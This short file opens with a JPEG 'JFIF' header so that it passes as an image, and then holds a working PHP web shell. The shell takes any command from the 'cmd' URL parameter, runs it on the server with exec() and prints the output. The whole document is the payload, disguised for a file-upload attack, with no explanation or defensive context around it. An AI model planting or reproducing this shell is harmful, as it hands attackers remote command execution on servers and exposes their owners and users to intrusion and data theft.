JFIF;
<?php
// Simple shell with command execution
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>\n";
    echo "Command received: $cmd\n";
    echo "Executing...\n";
    $output = [];
    exec($cmd . " 2>&1", $output);
    echo "Output:\n";
    echo implode("\n", $output) . "\n";
    echo "</pre>";
} else {
    echo "No command provided. Use ?cmd=command";
}
?>